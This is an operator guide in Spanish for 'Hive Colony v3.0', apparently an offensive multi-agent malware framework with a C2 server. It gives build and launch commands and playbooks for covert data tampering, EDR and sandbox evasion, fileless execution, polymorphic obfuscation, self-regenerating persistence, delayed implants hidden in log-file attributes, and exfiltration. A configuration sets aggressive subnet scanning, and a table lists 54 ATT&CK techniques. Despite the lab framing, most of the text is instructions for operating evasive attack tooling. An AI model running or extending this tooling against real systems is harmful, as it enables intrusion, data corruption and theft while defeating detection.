# Hive Colony v3.0 — Guía de Operador

## Arquitectura

```
┌─────────────────────────────────────────────────────┐
│                   BEEKEEPER (CLI)                    │
│  status | inject | validate | kill-switch           │
├─────────────────────────────────────────────────────┤
│                 SHARED MEMORY ARENA                  │
│  ┌──────┐  ┌──────┐  ┌────────┐  ┌──────┐  ┌─────┐ │
│  │Worker│  │Drone │  │Honeybee│  │Weaver│  │Queen│ │
│  └──────┘  └──────┘  └────────┘  └──────┘  └─────┘ │
│  Saboteur    Seer     Chrononaut   Wax    HiveMind  │
│  Stigmergy  Phoenix  WhisperNet           Tournament│
├─────────────────────────────────────────────────────┤
│                    C2 SERVER (8443)                  │
│              DASHBOARD WEB (8080/8081)               │
└─────────────────────────────────────────────────────┘
```

## Instalación

```bash
git clone https://github.com/Ruby570bocadito/hive-colony
cd hive-colony
source build_env.sh
cargo build --release --workspace
```

## Uso Rápido — Laboratorio Local

```bash
# 1. Iniciar C2 + dashboard
python3 tests/c2_server.py --port 8443 &
python3 tests/dashboard.py --port 8080 &

# 2. Definir arena
export __HIVE_ARENA=hive_lab

# 3. Lanzar agentes (orden recomendado)
./target/release/worker &
./target/release/drone &
./target/release/honeybee &
./target/release/weaver &
./target/release/queen &

# 4. Monitorear
./target/release/beekeeper status --watch

# 5. Campaña completa
./scripts/scenario.sh --quick
```

## Módulos por Agente

| Agente | Módulos | Función |
|--------|---------|---------|
| **Worker** | Saboteur, Seer, Stigmergy | Escaneo, mutación de datos, telemetría |
| **Drone** | Seer, Phoenix, Stigmergy | Decisiones RL, regeneración, predicción |
| **Honeybee** | Chrononaut, WhisperNet | Exfiltración, cápsulas temporales, relay P2P |
| **Weaver** | Wax | Ofuscación polimórfica de payloads |
| **Queen** | Tournament, HiveMind, WhisperNet | Torneos darwinianos, consenso, broadcast P2P |

## Playbooks

### 🎯 Playbook 1: Prueba de Integridad (Saboteur)
```bash
# 1. Preparar datos financieros simulados
echo 'account,balance,date
1001,1250000,2024-01-15' > /tmp/ledger.csv

# 2. Lanzar Worker (activa Saboteur automáticamente)
export __HIVE_ARENA=test_arena
./target/release/worker &

# 3. Verificar mutación
cat /tmp/ledger.csv  # Datos alterados
./target/release/beekeeper status
```

### 🎯 Playbook 2: Evasión EDR
```bash
# Verificar que Hive es indetectable
./target/release/beekeeper validate

# Salida esperada:
#   ✓ TCP ports     — Ningún puerto TCP escuchando
#   ✓ ONNX sigs     — Sin firmas ONNX
#   ✓ Debugger      — Anti-debug activo
#   ✓ Sandbox       — Anti-sandbox activo
#   ✓ Memfd         — Fileless exec disponible
#   ✓ Polymorphic   — Weaver mutate funcional
#   ✓ Agent names   — Nombres ofuscados
```

### 🎯 Playbook 3: Campaña APT Completa
```bash
# 5 fases, 1 comando:
./scripts/scenario.sh --quick --report

# O paso a paso con docker:
docker compose up -d
docker compose logs -f monitor
```

### 🎯 Playbook 4: Persistencia (Phoenix)
```bash
# El Drone regenera Workers caídos automáticamente
# Verificar fragmentos de genoma:
ls -la /dev/shm/.hive_genome/
# Reconstruir desde fragmentos:
./target/release/beekeeper hivemind
```

### 🎯 Playbook 5: Cápsulas del Tiempo (Chrononaut)
```bash
# Honeybee planta cápsulas antes de exfiltrar
# Se activan 1-4h después automáticamente
# Verificar cápsulas:
getfattr -d /var/log/*.log 2>/dev/null | grep user.hive
```

## Configuración (`hive.toml`)

```toml
[colony]
aggressive = true
scan_subnets = ["192.168.1.0/24"]

[agents]
shaper_decision_interval_secs = 60

[consensus]
hoarder_threshold = 0.8

[heartbeat]
interval_secs = 10
timeout_secs = 30

[exploits]
safe_mode = true

[timing]
heartbeat_interval_secs = 10
```

## MITRE ATT&CK Coverage (54 técnicas)

| Táctica | Técnicas |
|---------|----------|
| TA0001 Initial Access | T1566, T1078, T1190, T1091 |
| TA0002 Execution | T1059, T1204, T1106, T1559 |
| TA0003 Persistence | T1547, T1098, T1053, T1136, T1505, T1542.001 |
| TA0004 Privilege Escalation | T1548, T1068, T1055, T1134 |
| TA0005 Defense Evasion | T1564, T1553, T1027, T1140, T1205 |
| TA0006 Credential Access | T1555, T1003, T1606 |
| TA0007 Discovery | T1082, T1083, T1046, T1016, T1518 |
| TA0008 Lateral Movement | T1021, T1570, T1091 |
| TA0009 Collection | T1005, T1074, T1119, T1560 |
| TA0010 Exfiltration | T1041, T1567, T1052 |
| TA0011 Command & Control | T1573, T1095, T1572, T1090 |
| TA0040 Impact | T1565, T1499, T1486, T1485 |
| TA0042 Resource Dev | T1587, T1588 |
| TA0043 Recon | T1595, T1590 |

## Resolución de Problemas

| Síntoma | Causa | Solución |
|---------|-------|----------|
| `HiveChamber::connect` falla | Arena no existe | Exportar `__HIVE_ARENA` idéntico en todos los procesos |
| Agentes no se ven entre sí | IPC namespace | Usar `ipc: host` en Docker o `--ipc=host` |
| Seer predice todo riesgo 0 | Sin telemetría | Worker necesita tiempo para recolectar datos |
| Tournament no avanza | Pocos competidores | Queen necesita al menos 2 generaciones |
| Windows build falla | Faltan librerías | `sudo apt-get install mingw-w64` |
| WhisperNet no enruta | Sin peers | Los peers se registran automáticamente vía arena |

## Comandos Rápidos

```bash
beekeeper status --watch       # Dashboard terminal en vivo
beekeeper inject -a target_ip -v 10.0.0.5 -c 0.95  # Inyectar creencia
beekeeper validate             # Verificar evasión EDR
beekeeper kill-switch --confirm # Apagar colonia
beekeeper tournament           # Ver torneos
beekeeper hivemind             # Ver directivas
scripts/scenario.sh --quick    # Campaña 5 fases
```

## Docker Compose

```bash
# Stack completo
docker compose up -d

# Servicios:
#   c2-server   :8443 — C2 endpoint
#   queen       :—    — Reina + torneos + HiveMind
#   worker      :—    — Escáner + Saboteur
#   drone       :—    — Decisiones + Phoenix
#   honeybee    :—    — Exfil + Chrononaut
#   weaver      :—    — Ofuscación
#   victim      :—    — Datos simulados
#   monitor     :—    — EDR detection monitor
#   dashboard   :8081 — Web UI

# Ver resultados:
docker compose logs monitor
open http://localhost:8081
```

---
*Hive Colony v3.0 — 135 tests, 54 técnicas MITRE, 0 warnings, cross-compile Windows/Linux*
